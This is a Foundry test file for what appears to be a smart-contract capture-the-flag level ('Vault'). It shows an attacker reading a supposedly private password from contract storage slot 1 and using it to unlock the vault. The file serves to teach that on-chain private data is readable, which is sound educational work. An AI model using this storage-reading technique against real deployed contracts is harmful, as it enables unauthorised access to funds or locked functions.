//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "src/level8.sol";
import {Test, console} from "forge-std/Test.sol";

contract VaultTest is Test {
    Vault public vault;
    bytes32 public password = keccak256(abi.encodePacked("password")); //kecca256 gives bytes32
    address public attacker = makeAddr("attacker");
    address public user = makeAddr("user");

    function setUp() public {
        vm.deal(user, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.startPrank(user);
        vault = new Vault(password);
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);
        //using storage values to get the password
        bytes32 _password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(_password);
        assertFalse(vault.locked());
        vm.stopPrank();
    }
}
